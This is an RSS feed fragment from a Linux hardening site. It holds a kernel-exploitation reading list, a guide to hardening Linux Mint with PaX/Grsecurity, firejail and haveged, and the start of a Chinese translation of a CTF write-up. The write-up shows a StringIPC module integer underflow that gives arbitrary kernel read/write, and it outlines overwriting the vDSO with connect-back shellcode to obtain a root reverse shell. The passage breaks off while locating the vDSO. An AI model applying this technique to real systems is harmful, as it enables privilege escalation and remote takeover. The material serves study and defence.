  &lt;li&gt;The Art of Software Security Assessment: Identifying and Preventing Software Vulnerabilities –  &lt;em&gt;Mark Dowd, John McDonald, Justin Schuh&lt;/em&gt; [&lt;a href=&quot;http://www.amazon.com/The-Software-Security-Assessment-Vulnerabilities/dp/0321444426&quot;&gt;Amazon&lt;/a&gt;]&lt;/li&gt;
  &lt;li&gt;Fuzzing: Brute Force Vulnerability Discovery – &lt;em&gt;Michael Sutton, Adam Greene, Pedram Amini&lt;/em&gt; [&lt;a href=&quot;http://www.amazon.com/Fuzzing-Brute-Force-Vulnerability-Discovery/dp/0321446119&quot;&gt;Amazon&lt;/a&gt;]&lt;/li&gt;
  &lt;li&gt;Fuzzing for Software Security Testing and Quality Assuranc – &lt;em&gt;Ari Takanen, Jared DeMott, Charlie Miller&lt;/em&gt; [&lt;a href=&quot;http://www.amazon.com/Fuzzing-Software-Security-Assurance-Information/dp/1596932147&quot;&gt;Amazon&lt;/a&gt;]&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;reference-papers&quot;&gt;-[ 4. Reference Papers&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html&quot;&gt;Intel® 64 and IA-32 Architectures Software Developer Manuals&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://phrack.org/archives/issues/64/6.txt&quot;&gt;Attacking the Core : Kernel Exploiting Notes&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://phrack.org/archives/issues/66/15.txt&quot;&gt;Linux Kernel Heap Tampering Detection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jon.oberheide.org/blog/2010/09/10/linux-kernel-can-slub-overflow/&quot;&gt;Linux Kernel CAN SLUB Overflow&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.vsecurity.com/download/papers/slob-exploitation.pdf&quot;&gt;A Heap of Trouble: Breaking the Linux Kernel SLOB Allocator&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.fi.muni.cz/~xslaby/sklad/teze.pdf&quot;&gt;Automatic Bug-finding Techniques for Linux Kernel&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.usenix.org/legacy/events/woot11/tech/final_files/Yamaguchi.pdf&quot;&gt;Vulnerability Extrapolation: Assisted Discovery of Vulnerabilities Using Machine Learning&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html&quot;&gt;Offset2lib: bypassing full ASLR on 64bit Linux&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://crypto.stanford.edu/~blynn/rop/&quot;&gt;64-bit Linux Return-Oriented Programming&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://insecure.org/sploits/non-executable.stack.problems.html&quot;&gt;Defeating Solar Designer’s Non-executable Stack Patch Summary&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html&quot;&gt;Introduction to return oriented programming (ROP)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://phrack.org/archives/issues/58/4.txt&quot;&gt;The advanced return-into-lib(c) exploits: PaX case study&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Wed, 20 Jan 2016 02:26:37 +0800</pubDate>
        <link>http://www.hardenedlinux.org/system-security/2016/01/20/an-introduction-to-linux-kernel-exploitation.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2016/01/20/an-introduction-to-linux-kernel-exploitation.html</guid>
        
        
        <category>system-security</category>
        
      </item>
    
      <item>
        <title>Hardening your desktop: Linux Mint with PaX/Grsecurity </title>
        <description>&lt;p&gt;By citypw&lt;/p&gt;

&lt;p&gt;–[ CONTENTS&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;About this doc&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Build and install customized kernel with PaX/Grsecurity patch&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;PaX flags: paxctl-ng &amp;amp; pax-bites&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Kernel tuning&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Networking&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Sandboxing: seccomp&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Crypto&lt;/p&gt;

    &lt;p&gt;6.1 Entropy&lt;/p&gt;

    &lt;p&gt;6.2 Daily bread&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;about-this-documentation&quot;&gt;–[ 0. About this documentation&lt;/h2&gt;
&lt;p&gt;We just celebrated another new year a couple of days ago, which means it’s 2016 already. A another new year usually just brings us to another fight. FOSS is still our fortress, as always.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;People may quite excited about we are getting one step closer to the Singularity. &lt;/li&gt;
  &lt;li&gt;People may praise about how great of technological evolution will be.&lt;/li&gt;
  &lt;li&gt;People may just stuck in some shitty places and get drunk and going out of nowhere.&lt;/li&gt;
  &lt;li&gt;People may……….well, it’s none of my fuc*ing business.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I just reviewed the current status of GNU/Linux distros. Sadly to say, only a few distros( Aphine, Gentoo, etc) shipped PaX/Grsecurity by default. Even worse if you take a glance at the GNU/Linux desktop field. The GUI is looking better than ever before. But the sense of security is almost like a decade ago. This is what make me ticks, to write this doc. I’m trying to show you there’s a pretty easy way to do the whole process of hardening your desktop/laptop. I choose Linux Mint 17 as exmaple for two reasons.&lt;/p&gt;

&lt;p&gt;1, I’m a Linux Mint user since Linut Mint 15. I personally like MATE and I hate GNOME3;-)&lt;/p&gt;

&lt;p&gt;2, Linux Mint is the highest rank GNU/Linux distro in past 5 years( at least) according to &lt;a href=&quot;http://distrowatch.com/&quot;&gt;DistroWatch&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;build-and-install-customized-kernel-with-paxgrsecurity-patch&quot;&gt;–[ 1. Build and install customized kernel with PaX/Grsecurity patch&lt;/h2&gt;

&lt;p&gt;I assumed you have Linux Mint 17 installed on your laptop or PC already. The 1st thing to do is install some packages will be used in the building of PaX/Grsecurity kernel:&lt;/p&gt;
&lt;pre&gt;
sudo apt-get update &amp;amp;&amp;amp; sudo apt-get upgrade

sudo apt-get install build-essential libncurses5-dev gcc-4.8-plugin-dev libssl-dev
&lt;/pre&gt;

&lt;p&gt;Then, download &lt;a href=&quot;https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.3.3.tar.xz&quot;&gt;linux kernel 4.3.3&lt;/a&gt; and PaX/Grsecurity &lt;a href=&quot;https://github.com/hardenedlinux/hardenedlinux_profiles/raw/master/linux-mint_desktop/grsecurity-3.1-4.3.3-201601051958.patch&quot;&gt;test patch for 4.3.3&lt;/a&gt;( note: for any commercial purpose use, I’m highly recommend you to use &lt;a href=&quot;https://grsecurity.net/announce.php&quot;&gt;PaX/Grsecurity stable patch&lt;/a&gt;). Then, you could use &lt;a href=&quot;https://github.com/hardenedlinux/hardenedlinux_profiles/raw/master/linux-mint_desktop/grsec-4.3.3-for-linux-mint-17.config&quot;&gt;my config&lt;/a&gt; to build kernel:&lt;/p&gt;
&lt;pre&gt;
cd kernel-src
patch -p1 &amp;lt; ../grsecurity-patch
cp grsec-4.3.3-for-linux-mint-17.config .config
make -j4 deb-pkg
&lt;/pre&gt;

&lt;p&gt;Then you should see some .deb files and you can use dpkg to install your new kernel:&lt;/p&gt;
&lt;pre&gt;
dpkg -i *.deb
&lt;/pre&gt;

&lt;p&gt;Now you should have multiple kernel options. Comment two lines in /etc/default/grub if you want to choose which kernel to bootup:&lt;/p&gt;
&lt;pre&gt;
#GRUB_HIDDEN_TIMEOUT=0
#GRUB_HIDDEN_TIMEOUT_QUIET=true
&lt;/pre&gt;

&lt;p&gt;And run:&lt;/p&gt;
&lt;pre&gt;
update-grub2
&lt;/pre&gt;

&lt;p&gt;Before reboot, plz make sure you install some popular applications:&lt;/p&gt;
&lt;pre&gt;
sudo apt-get install chromium-browser vlc firefox amarok
&lt;/pre&gt;

&lt;h2 id=&quot;pax-flags-paxctl-ng--pax-bites&quot;&gt;–[ 2. PaX flags: paxctl-ng &amp;amp; pax-bites&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://en.wikibooks.org/wiki/Grsecurity/Appendix/PaX_Flags&quot;&gt;PaX flags&lt;/a&gt; is provided by PaX/Grsecurity to tell the kernel which mitigations should be used in the specific binary. More flags are enabled, more security you gains. But some binaries doesn’t work with some PaX flags, e.g: JIT can’t work with MPROTECT. For the sake of making PaX/Grsecurity work with Linux Mint, we’ll have to disable some mitigations in some binaries. I wrote a tool is called &lt;a href=&quot;https://github.com/hardenedlinux/pax-bites&quot;&gt;pax-bites&lt;/a&gt;, which utilize paxctl-ng to add/delete PaX flags. The config file of pax-bites is very easy to write. The format is like this:&lt;/p&gt;
&lt;pre&gt;
file_path;flags
&lt;/pre&gt;

&lt;p&gt;For example, I’m using &lt;a href=&quot;https://github.com/hardenedlinux/hardenedlinux_profiles/raw/master/linux-mint_desktop/pax_flags_mint17.config&quot;&gt;this config&lt;/a&gt;:&lt;/p&gt;
&lt;pre&gt;
cat pax_flags_mint17.config 
/usr/lib/jvm/java-7-openjdk-amd64/jre/bin/java;m
/usr/bin/python2.7;m
/usr/bin/python3.4;m
/usr/lib/mdm/mdmwebkit;m
/usr/lib/firefox/firefox;m
/usr/lib/firefox/plugin-container;m
/usr/lib/thunderbird/thunderbird;m
/usr/lib/chromium-browser/chromium-browser;m
/usr/bin/amarok;m
/usr/bin/pulseaudio;m
&lt;/pre&gt;

&lt;p&gt;The very limited number of applications on Linut Mint GNU/Linux have been tested by us( I and other members of Hardenedlinux community). If you find some applications won’t work correctly caused by PaX flags, you can write your own config( plz let us know) or just file a bug by our &lt;a href=&quot;https://github.com/hardenedlinux/hardenedlinux_profiles&quot;&gt;github repo&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;kernel-tuning&quot;&gt;–[ 3. Kernel tuning&lt;/h2&gt;

&lt;p&gt;The current &lt;a href=&quot;https://github.com/hardenedlinux/hardenedlinux_profiles/raw/master/linux-mint_desktop/sysctl.conf&quot;&gt;sysctl.conf&lt;/a&gt;. We will do more work on this. Any detail about security-related kernel tuning, you might want to check &lt;a href=&quot;http://hardenedlinux.org/system-security/2015/06/09/debian-security-chklist.html&quot;&gt;Debian security checklist&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;networking&quot;&gt;–[ 4. Networking&lt;/h2&gt;

&lt;p&gt;Iptables is a eay-to-use stateful firewall. It’s very important to let your desktop/laptop have it. &lt;a href=&quot;https://github.com/hardenedlinux/hardenedlinux_profiles/blob/master/linux-mint_desktop/iptables_mint17.sh&quot;&gt;Some policies&lt;/a&gt; has been tested. You can use it directly. Any feedback or improvement are always welcome.&lt;/p&gt;

&lt;p&gt;You might be interested in &lt;a href=&quot;https://raw.githubusercontent.com/citypw/DNFWAH/master/2/d2_0x06_Hacking_the_wholism_of_linux_net.txt&quot;&gt;how iptables/netfilter works&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;sandbox-seccomp-bpf-based-implementation&quot;&gt;–[ 5. Sandbox: Seccomp-bpf based implementation&lt;/h2&gt;

&lt;p&gt;The sandboxing technolog has a very long history of evolution journey in past decades. Here we’re just going through &lt;a href=&quot;http://ekoparty.org/archive/2013/charlas/Sandboxing%20Linux%20code%20to%20mitigate%20exploitation%20%28Or-%20How%20to%20ship%20a%20secure%20operating%20system%20that%20includes%20third-party%20code%29.pdf&quot;&gt;Seccomp based implementation&lt;/a&gt;. &lt;a href=&quot;https://wiki.mozilla.org/Security/Sandbox/Seccomp&quot;&gt;Seccomp&lt;/a&gt; is being merged into vanilla kernel since 2.6.12. Seccomp can not support complicated task because it whitelisted a few system calls for computing-only task. Anyway, it’s not what we talk about here. We only care about Seccomp’s extension: &lt;a href=&quot;https://www.kernel.org/doc/Documentation/prctl/seccomp_filter.txt&quot;&gt;Seccomp-bpf&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;There are two approaches to sandboxing the application you choose:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;You can add Seccomp-bpf polices into the application by tweaking the polices via prctl(). IMOHO, it’s quite like pledge() system call in latest OpenBSD. Here’s &lt;a href=&quot;https://outflux.net/teach-seccomp/&quot;&gt;some examples&lt;/a&gt; from Kees Cook( Yeah, that Kees who helped out to brings the real sense of security into kernel upstream;-))&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Use a external wrapper program to exec the application with Seccomp-bpf filtering polices.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The 1st approach is developer-only. Because you’ll have to modify the source code add those polices into it. Otherwise, I don’t think this gonna happen in GNU/Linux community. OpenBSD community are trying add &lt;a href=&quot;http://www.openbsd.org/cgi-bin/man.cgi/OpenBSD-current/man2/pledge.2&quot;&gt;pledge()&lt;/a&gt; into diverse applications but…the people who cares about security from OpenBSD community were called “&lt;a href=&quot;http://article.gmane.org/gmane.linux.kernel/706950&quot;&gt;bunch of masturbating monkeys&lt;/a&gt;” by Linus Torvalds….&lt;/p&gt;

&lt;p&gt;The 2nd approach seems quite flexible. Here are two options:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://github.com/thestinger/playpen&quot;&gt;Playpen&lt;/a&gt;, developed by Daniel Micay.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://firejail.wordpress.com/&quot;&gt;Firejail&lt;/a&gt;, developed/maintained by a group of people.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I choose firejail, because the community provides a bunch of sandboxing polices for &lt;a href=&quot;http://forums.linuxmint.com/viewtopic.php?f=42&amp;amp;t=202735&quot;&gt;some popular applications&lt;/a&gt;( firefox, vlc, chromium, etc). It’s almost like off-the-shell stuff. You can download the latest version of &lt;a href=&quot;http://sourceforge.net/projects/firejail/files/firejail/&quot;&gt;firejail&lt;/a&gt; and install it by package or compile it from source code. Note that the default Seccomp-bpf policies doesn’t have any system call whitelists, which mean it is a sandbox without filtering any syscalls basically. So &lt;a href=&quot;https://l3net.wordpress.com/2015/04/13/firejail-seccomp-guide/&quot;&gt;write your own one&lt;/a&gt; if you want.&lt;/p&gt;

&lt;h2 id=&quot;crypto&quot;&gt;–[ 6. Crypto&lt;/h2&gt;

&lt;p&gt;Crypto engineering has been playing a very important role in past decade. System security &amp;amp; crypto engineering are like twins. One can’t live without another. Use crypto without system hardening is like building your infrastructre on sand. Only hardening the system without using crypto is like archer’s holding a fancy Elf silver-bow but doesn’t have any arrows at all. Don’t forget the goal of infosec is to protect the fuc*ing information in 3 basic dimensions: C(onfidentiality), I(ntegrity) and A(vailability).&lt;/p&gt;

&lt;h2 id=&quot;entropy&quot;&gt;—-[ 6.1 Entropy&lt;/h2&gt;

&lt;p&gt;Entropy is matter to private/session keys. It’d be a big deal if you’re using GNU/Linux as server. Desktop won’t be have much trouble about it. PaX/Grsecurity increased entropy for the kernel somehow. You may still want to install a daemon to ensuring the system always has enough entrop. Let the cryptographers worries about blocking/non-blocking issues on &lt;a href=&quot;http://www.2uo.de/myths-about-urandom/&quot;&gt;random/urandom&lt;/a&gt;. All you need to know is &lt;a href=&quot;http://www.issihosts.com/haveged/history.html&quot;&gt;Haveged&lt;/a&gt; will be very helpful to your server/desktop. You can &lt;a href=&quot;https://www.digitalocean.com/community/tutorials/how-to-setup-additional-entropy-for-cloud-servers-using-haveged&quot;&gt;install it via&lt;/a&gt;:&lt;/p&gt;

&lt;pre&gt;
Installing haveged on Debian/Ubuntu

You can easily install haveged on Debian and Ubuntu by running the following command:

# apt-get install haveged

Should this package not be available in your default repositories, you will need to compile from source (see below)

Once you have the package installed, you can simply edit the configuration file located in /etc/default/haveged, ensuring the following options are set (usually already the default options):

DAEMON_ARGS=&quot;-w 1024&quot;

Finally, just make sure it&#39;s configured to start on boot:

# update-rc.d haveged defaults
&lt;/pre&gt;

&lt;h2 id=&quot;daily-bread&quot;&gt;—-[ 6.2 Daily bread&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://pidgin.im/&quot;&gt;Pidgin&lt;/a&gt; + OTR&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;
sudo apt-get install pidgin pidgin-otr
&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.torproject.org/&quot;&gt;Tor broswer&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;It can bring you anonymity. Download it &lt;a href=&quot;https://www.torproject.org/download/download-easy.html.en&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.gnupg.org/&quot;&gt;GnuPG&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Encryption/Decryption email with GPG is not a bad idea. You may also want to try &lt;a href=&quot;https://github.com/stealth/opmsg&quot;&gt;opmsg&lt;/a&gt;.&lt;/p&gt;
</description>
        <pubDate>Sun, 10 Jan 2016 11:54:45 +0800</pubDate>
        <link>http://www.hardenedlinux.org/system-security/2016/01/10/hardening-your-desktop-linux-mint-with-grsec.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2016/01/10/hardening-your-desktop-linux-mint-with-grsec.html</guid>
        
        
        <category>system-security</category>
        
      </item>
    
      <item>
        <title>Bypassing SMEP Using vDSO Overwrites(使用vDSO重写来绕过SMEP防护)</title>
        <description>&lt;p&gt;Shawn: Intel的SMEP( Sandybridge加入）和SMAP（本来应该是Haswell加入，最终推迟到了broadwell时才加入）中SMEP已经大规模的部署到了生产环境中，由于一些媒体的误导，企业和个人都对SMEP有着过高的期望，斯拉夫兵工厂至少在13个月以前就有针对SMEP绕过的weaponized exploit，这次itszn的绕过SMEP防护的实现非常的精彩，直接把SMEP绕过打成了“白菜价”，而另外一方面，经过h4rdenedzer0的研究和测试发现，虽然PaX/Grsecurity中的类似USERCOPY可以轻松防御这种绕过，但更有意思的是没有任何防御feature的情况下仅靠代码级别的调整也能启到security through obscurity的作用，至少可以防止massive exploit的通杀。这个case值得关注的点还是在于单点防御是无效的，系统层的加固必须以纵深防御的思路来做，多个mitigation feature+代码级加固会让兵工厂也很蛋疼，当然另外一方面bypass难度提升了他们的利润也会上升;-)&lt;/p&gt;

&lt;p&gt;原文地址 &lt;a href=&quot;http://itszn.com/blog/?p=21&quot;&gt;Bypassing SMEP Using vDSO Overwrites&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;译者：n3o4po11o&lt;/p&gt;

&lt;p&gt;在今年的CSAW(Cyber Security Awareness Week)决赛中有几个内核相关的挑战。下文是关于我解决题名为”StringIPC”的思路。(作者为&lt;a href=&quot;https://twitter.com/mncoppola&quot;&gt;Michael Coppola&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;摆在我们面前的机器为一台64位ubuntu 14.04.3运行了3.13版本的内核并开启SMEP，kptr_restrict，demsg_restrict的虚拟机。内核中加载了名为”StringIPC”的内核模块，但在home目录中提供了该模块的源码。你可以在&lt;a href=&quot;https://github.com/mncoppola/StringIPC/blob/master/main.c&quot;&gt;这里&lt;/a&gt;找到源码，我也会在下文中展示一些重要的部分。&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;分析内核模块&lt;/h2&gt;

&lt;p&gt;StringIPC模块实现了最基本的进程间通信的功能，允许对位于/dev/csaw的设备在不同通道下进行读写数据的操作。有8个控制码（codes）可以用来对通道进行创建，修改和读写数据。&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1
#define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2
#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3
#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4
#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5
#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6
#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7
#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;CSAW_ALLOC_CHANNEL允许用户创建一个新通道和根据给定的大小创建一个新缓冲区，CSAW_GROW_CHANNEL和CSAW_SHRINK_CHANNEL使用了krealloc来改变通道的缓冲区大小。CSAW_READ_CHANNEL和CSAW_WRITE_CHANNEL用来读取和写入由CSAW_SEEK_CHANNEL所指向的当前通道的内存数据。最后CSAW_OPEN_CHANNEL和CSAW_CLOSE_CHANNEL用来确定当前与ioctl进行交互的通道。&lt;/p&gt;

&lt;p&gt;Bug存在于使用了krealloc的realloc_ipc_channel:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;static int realloc_ipc_channel ( struct ipc_state *state, int id, size_t size, int grow )
{
    struct ipc_channel *channel;
    size_t new_size;
    char *new_data;

    channel = get_channel_by_id(state, id);
    if ( IS_ERR(channel) )
        return PTR_ERR(channel);

    if ( grow )
        new_size = channel-&amp;gt;buf_size + size;
    else
        new_size = channel-&amp;gt;buf_size - size;

    new_data = krealloc(channel-&amp;gt;data, new_size + 1, GFP_KERNEL);
    if ( new_data == NULL )
        return -EINVAL;

    channel-&amp;gt;data = new_data;
    channel-&amp;gt;buf_size = new_size;

    ipc_channel_put(state, channel);

    return 0;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;当我们试图缩小通道缓冲区的大小时，我们缩小了一个比原来缓冲区大小还大1的值，此时new_size会发生underflow从而变成了INT_MAX。当krealloc调用时new_size+1，接着发生overflow回到了0。从krealloc的源码可以看出，当new_size为0时，返回一个ZERO_SIZE_PTR：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;void *krealloc(const void *p, size_t new_size, gfp_t flags) {
    void *ret;

    if (unlikely(!new_size)) {
         kfree(p);
         return ZERO_SIZE_PTR;
    }
...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;ZERO_SIZE_PTR定义为((void *)16)。当我们重新调整大小后，channel-&amp;gt;data=0x10而channel_buf_size=INT_MAX。通过在0x10处获取偏移量，我们可以在内核空间(kernelspace)实现任意读写。&lt;/p&gt;

&lt;h2 id=&quot;section-1&quot;&gt;任意写利用&lt;/h2&gt;

&lt;p&gt;既然我们可以任意读写，我们可以开始创建exploit。由于此时SMEP开启，我们不能直接覆盖一些数据然后跳转到用户空间(userspace)去执行已经提前准备好的shellcode。为了绕过SMEP我们可以使用一个覆盖vDSO的技术，来让另外一个进程以root权限运行进而运行我们反弹（conncet-back）shellcode。&lt;/p&gt;

&lt;p&gt;整体的思路如下：vDSO同时映射在内核空间以及每一个进程的虚拟内存中，包括那些以root权限运行的进程。通过调用那些不需要上下文切换（context switching）的系统调用可以加快这一步骤(定位vDSO)。vDSO在用户空间(userspace)映射为R/X，而在内核空间(kernelspace)则为R/W。这允许我们在内核空间修改它，接着在用户空间执行。&lt;/p&gt;

&lt;p&gt;下面是使用这个技术的步骤：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;1.实现任意读写
2.在内核空间定位vDSO
3.为root权限运行的进程创建反弹shellcode
4.用shellcode覆盖部分vDSO
5.监听反弹root shell&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;在我们利用StringIPC模块时，我们已经能够任意读写内存了，所以下一步我们将在runtime定位vDSO.&lt;/p&gt;

&lt;h2 id=&quot;locating-vdso&quot;&gt;Locating vDSO&lt;/h2&gt;

&lt;p&gt;下面是内核代码中用于在内核空间初始化vDSO页的代码段：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;static int __init init_vdso_vars(void) {
    int npages = (vdso_end - vdso_start + PAGE_SIZE - 1) / PAGE_SIZE;
    int i;
    char *vbase;
    vdso_size = npages &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt; PAGE_SHIFT&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;vdso_pages =&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;kmalloc(sizeof(struct&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;page&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;*)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;npages&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;GFP_KERNEL&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;vdso_pages&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;oom&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;i =&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;npages&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;page&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;p =&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;alloc_page(GFP_KERNEL);&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;oom&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;vdso_pages&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;copy_page&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;page_address&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;vdso_start&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;PAGE_SIZE&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
